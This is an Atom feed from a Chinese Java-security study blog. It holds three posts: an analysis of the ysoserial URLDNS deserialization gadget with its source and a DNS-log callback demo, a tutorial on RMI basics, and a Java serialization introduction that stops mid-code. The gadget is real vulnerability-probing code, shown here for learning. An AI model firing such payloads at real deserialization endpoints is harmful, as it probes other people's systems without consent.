<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ca01h&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ca0y1h.top/"/>
  <updated>2021-03-13T15:50:36.419Z</updated>
  <id>http://ca0y1h.top/</id>
  
  <author>
    <name>ca01h</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ysoserial URLDNS详细分析.md</title>
    <link href="http://ca0y1h.top/Java/javasec/4.ysoserial%20URLDNS%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>http://ca0y1h.top/Java/javasec/4.ysoserial%20URLDNS%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2021-03-13T15:47:18.000Z</published>
    <updated>2021-03-13T15:50:36.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java安全学习之ysoserial-URLDNS详细分析">Java安全学习之ysoserial URLDNS详细分析</h1><p>参考：</p><p>P神—代码审计—Java安全漫谈-08.反序列化篇(2)</p><p>java测试环境:</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313164533.png" alt=""></p><p>打开ysoserial项目，找到<code>ysoserial/src/main/ysoserial/payloads/URLDNS.java</code>文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是用来生成payload的Gadget。代码暂时看不明白问题不大，可以先看注释来找反序列化的入口点<code>readObject</code>函数。</p><p>那么，我们可以直奔 HashMap 类的 readObject ⽅法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165103.png" alt=""></p><p>因为从注释中可知道，是hashCode的计算操作触发了DNS请求，所以直接看到1413行，这里使用hash方法处理key，跟进hash方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165253.png" alt=""></p><p>这里调用了<code>key</code>的<code>hashCode</code>方法，调用<code>key</code>的<code>hashCode</code>方法就是调用URL类型的hashCode的方法。</p><p>为什么这么说？回到URLDNS类文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170320.png" alt=""></p><p>很明显是要把URL对象当做Key，那么就查看<code>URL.java</code>文件中的<code>hashCode</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170503.png" alt=""></p><p><code>hashCode</code>是一个私有变量，默认值为-1，所以接着调用了hanlder类的<code>hashCode</code>方法,查看<code>URLStreamHandler</code>类的<code>hanlder</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170757.png" alt=""></p><p>继续跟<code>getHostByName</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170956.png" alt=""></p><p>终点就在<code>getByName</code>API函数，把Host解析成IP地址：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313171010.png" alt=""></p><p>从而会触发一次DNS请求。</p><p>回到HashMap.java的<code>readObject</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313232828.png" alt=""></p><p>看到第1410行，<code>key</code>和<code>value</code>两个参数都是通过<code>readObject</code>获取的，那么肯定在序列化时向其中写了内容，因为没有序列化，哪来反序列化之说。在<code>HashMap.java</code>文件中搜索<code>writeObject</code>函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165649.png" alt=""></p><p>跟进<code>internalWriteEntries</code>函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165910.png" alt=""></p><p>我们发现这里的key和value是从tab[i]中取出来的,而tab的值就是HashMap的table的值，而tab的值就是HashMap的table的值。如果我们想修改table的值的话,就是修改hashMap的put方法，查看put方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313233216.png" alt=""></p><p>如果我们调用了HashMap的put方法，就会去调用一次hash函数。</p><p>再回来看ysoserial给的Gadget：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313233605.png" alt=""></p><p>把URL对象作为key传给了hash函数，那么也就是调用URL.java的hash方法，最后到了<code>getByName</code>API函数。</p><p>其实我们也可以自己写一个demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UrlDnsDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://ufzv12.ceye.io&quot;</span>);</span><br><span class="line">        map.put(url, <span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313233900.png" alt=""></p><p>所以，⾄此，整个URLDNS的Gadget其实清晰⼜简单：</p><p>1.HashMap-&gt;readObject()</p><p>2.HashMap-&gt;hash()</p><p>3.URL-&gt;hashCode()</p><p>4.URLStreamHandler-&gt;hashCode()</p><p>5.URLStreamHandler-&gt;getHostAddress()</p><p>6.InetAddress-&gt;getByName()</p><p>从反序列化最开始的readObject，到最后触发DNS请求的getByName，只经过了6个函数调⽤。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java安全学习之ysoserial-URLDNS详细分析&quot;&gt;Java安全学习之ysoserial URLDNS详细分析&lt;/h1&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;P神—代码审计—Java安全漫谈-08.反序列化篇(2)&lt;/p&gt;
&lt;p&gt;java测试环境:&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Java" scheme="http://ca0y1h.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java安全学习之RMI</title>
    <link href="http://ca0y1h.top/Java/javasec/2.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8BRMI/"/>
    <id>http://ca0y1h.top/Java/javasec/2.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8BRMI/</id>
    <published>2021-03-13T15:47:04.000Z</published>
    <updated>2021-03-13T15:49:37.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java安全学习之RMI基础">Java安全学习之RMI基础</h1><p>参考：</p><p>java安全漫谈-04.RMI篇(1)</p><p><a href="https://www.jianshu.com/p/2c78554a3f36">深入理解RMI原理</a></p><p><a href="https://xz.aliyun.com/t/6660">先知——RMI-反序列化</a></p><p><a href="https://paper.seebug.org/1251/">Seebug——Java 安全-RMI-学习总结</a></p><p><a href="https://xz.aliyun.com/t/4711">浅显易懂的JAVA反序列化入门</a></p><p><a href="https://blog.csdn.net/he_and/article/details/105532007">【入坑JAVA安全】RMI基础看这一篇就足够了</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a></p><p>前置知识：</p><p>RPC、反射、动态代理</p><h2 id="0x01-RMI是什么">0x01 RMI是什么</h2><p>RMI（Remote Method Invocation），是一种跨JVM实现方法调用的技术。</p><p>在RMI的通信方式中，由以下三个大部分组成：</p><ul><li>Client：客户端调用服务端的方法</li><li>Registry：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li><li>Server：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。</li></ul><p>其中Client是客户端，Server是服务端，而Registry是注册中心。</p><p>客户端会Registry取得服务端注册的服务，从而调用服务端的远程方法。</p><p>注册中心在RMI通信中起到了一个什么样的作用？我们可以把他理解成一个字典，一个负责网络传输的模块。</p><p>服务端在注册中心注册服务时，需要提供一个key以及一个value，这个value是一个远程对象，Registry会对这个远程对象进行封装，使其转为一个远程代理对象。当客户端想要调用远程对象的方法时，则需要先通过Registry获取到这个远程代理对象，使用远程代理对象与服务端开放的端口进行通信，从而取得调用方法的结果。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210312141656.png" alt=""></p><h2 id="0x02-RMI基础使用">0x02 RMI基础使用</h2><p>Server部署：</p><ol><li>Server向Registry注册远程对象，远程对象绑定在一个<code>//hostL:port/objectname</code>上，形成一个映射表（Service-Stub）。</li></ol><p>Client调用：</p><ol><li>Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。</li><li>Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器</li><li>Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</li></ol><p>先定义一个远程接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">rmidemo</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在定义远程接口的时候需要继承<code>java.rmi.Remote</code>接口，并且修饰符需要为<code>public</code>否则远程调用的时候会报错。并且定义的方法里面需要抛出一个<code>RemoteException</code>的异常。</p><p>再编写一个远程接口的实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">rmidemo</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编写该实现类中需要将该类继承<code>UnicastRemoteObject</code>。</p><p>接着创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">servet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        rmidemo hello = <span class="keyword">new</span> RemoteHelloWorld();<span class="comment">//创建远程对象</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.rebind(<span class="string">&quot;hello&quot;</span>,hello);<span class="comment">//将远程对象注册到注册表里面，并且设置值为hello</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到了这一步，简单的RMI服务端的代码就写好了。下面来写一个客户端调用该远程对象的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rmi.RemoteHelloWorld;</span><br><span class="line"><span class="keyword">import</span> com.rmi.rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">clientdemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);<span class="comment">//获取远程主机对象</span></span><br><span class="line">        <span class="comment">// 利用注册表的代理去查询远程注册表中名为hello的对象</span></span><br><span class="line">        rmidemo hello = (rmidemo) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        System.out.println(hello.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这一步需要注意的是，如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。</p><p>参考文章中有关于对RMI过程源码分析或者流量分析的文章，我这里就摘取总结性的段落。</p><blockquote><p>所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.168.135.142:33769 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是hello()。</p></blockquote><h2 id="0x03-RMI攻击方式">0x03 RMI攻击方式</h2><blockquote><p>待填坑，等学完反序列化再来。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java安全学习之RMI基础&quot;&gt;Java安全学习之RMI基础&lt;/h1&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;java安全漫谈-04.RMI篇(1)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/2c78554a3f36&quot;&gt;深入理解RM
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Java" scheme="http://ca0y1h.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java安全学习之反序列化</title>
    <link href="http://ca0y1h.top/Java/javasec/3.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://ca0y1h.top/Java/javasec/3.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-03-13T15:46:37.000Z</published>
    <updated>2021-03-13T15:49:32.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java安全学习之反序列化">Java安全学习之反序列化</h1><p>参考：</p><p>P神—代码审计—Java安全漫谈-07.反序列化篇(1)</p><p><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><p><a href="http://www.lmxspace.com/2019/03/11/Java-web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">http://www.lmxspace.com/2019/03/11/Java-web学习之路-序列化和反序列化</a></p><p><a href="https://xz.aliyun.com/t/4711">https://xz.aliyun.com/t/4711</a></p><h2 id="0x01-Java序列化和反序列化">0x01 Java序列化和反序列化</h2><p>能学到Java序列化和反序列化的同学基本上肯定了解PHP的反序列化漏洞，也能写PHP反序列化的Gadget。其实这两者很相似，但又不尽相同。</p><blockquote><p><strong>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</strong><br><strong>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</strong></p></blockquote><p>Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</p><p>java中的一个类的对象要想序列化成功，必须满足两个条件：</p><ol><li>该类必须实现 <strong>java.io.Serializable</strong> 接口，因为 <strong>Serializable</strong> 接口是启用其序列化功能的接口。</li><li>该类的所有属性必须是可序列化的。</li></ol><p>实现序列化与反序列化代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">          <span class="comment">//定义obj对象</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">          <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">          <span class="comment">//writeObject()方法将obj对象写入object文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">          <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">          <span class="comment">//恢复对象</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码将 String 对象 obj1 序列化后写入文件 object 文件中，后又从该文件反序列化得到该对象。我们来看一下 object 文件中的内容：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313162924.png" alt=""></p><blockquote><p>这里需要注意的是，<code>ac ed 00 05</code>是 java 序列化内容的特征，</p></blockquote><p>再来看一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span 